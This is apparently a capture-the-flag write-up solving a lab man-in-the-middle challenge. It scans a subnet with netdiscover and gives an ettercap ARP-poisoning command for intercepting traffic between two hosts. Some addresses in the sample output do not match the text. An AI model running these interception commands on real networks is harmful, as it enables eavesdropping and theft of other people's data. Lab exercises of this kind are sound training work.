# Solving the Network Man-in-the-Middle (MITM) Challenge

## **Step 1: Check Personal IP**
To find the IP address of your own machine:

1. Run the following command in your terminal:
   ```bash
   ifconfig
   ```
  ![image](https://github.com/user-attachments/assets/47d7cca7-863f-4f2b-bfdd-607370229cff)


## **Step 2: Check Commands You Can Run with `sudo -l`**
To find out which commands you can execute with `sudo`:

1. Run:
   ```bash
   sudo -l
   ```
  ![image](https://github.com/user-attachments/assets/5be2c5a2-14eb-4537-be2b-52c53c50f9b8)

   This confirms that you can run `netdiscover` without a password.

---

## **Step 3: Run `netdiscover` on Your Subnet**
To scan the network and identify active devices:

1. Run `netdiscover` with the subnet you found in Step 1:
   ```bash
   sudo netdiscover -r 172.24.0.0/24
   ```

2. Observe the output for a list of IP and MAC addresses on the network. Example:
   ```
   172.22.0.1    00:11:22:33:44:55   router
   172.22.0.2    11:22:33:44:55:66   unknown
   172.22.0.3    22:33:44:55:66:77   unknown
   ```

     ![image](https://github.com/user-attachments/assets/d834f8d8-2355-47d4-aafe-7c39f4d652a1)

   Here, we found:
   - **172.24.0.1**: Likely the router or switch.
   - **172.24.0.2** and **172.24.0.3**: Two machines communicating with each other.

---


## **Step 4: Intercept Traffic with Ettercap**
To perform ARP poisoning and intercept data:

1. Choose one of the target IPs (e.g., `172.22.0.2`) and the other machine (e.g., `172.22.0.3`).

2. Run `ettercap` to perform a MITM attack:
   ```bash
    sudo ettercap -T -M arp ///172.24.0.2```

4. Watch the intercepted traffic in real-time within the terminal.

---

By following these steps, you should be able to identify the target devices, intercept their communication, and analyze any secrets being shared between them.
